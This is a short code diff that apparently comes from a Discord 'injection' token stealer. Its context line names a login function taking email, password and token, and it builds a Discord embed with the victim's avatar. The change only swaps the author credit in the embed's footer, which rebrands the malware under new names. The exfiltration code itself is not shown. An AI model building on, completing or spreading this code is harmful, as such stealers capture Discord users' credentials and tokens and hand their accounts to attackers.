@@ -680,7 +680,7 @@ const login = async (email, password, token) => {
           icon_url: `https://cdn.discordapp.com/avatars/${json.id}/${json.avatar}.webp`,
         },
         footer: {
-          text: '🎉・Discord Injection By Ayhu & Artonus・https://github.com/Black Reaper',
+          text: '🎉・Discord Injection By Aimz & idek・https://github.com/Black Reaper',
         },
       },
     ],
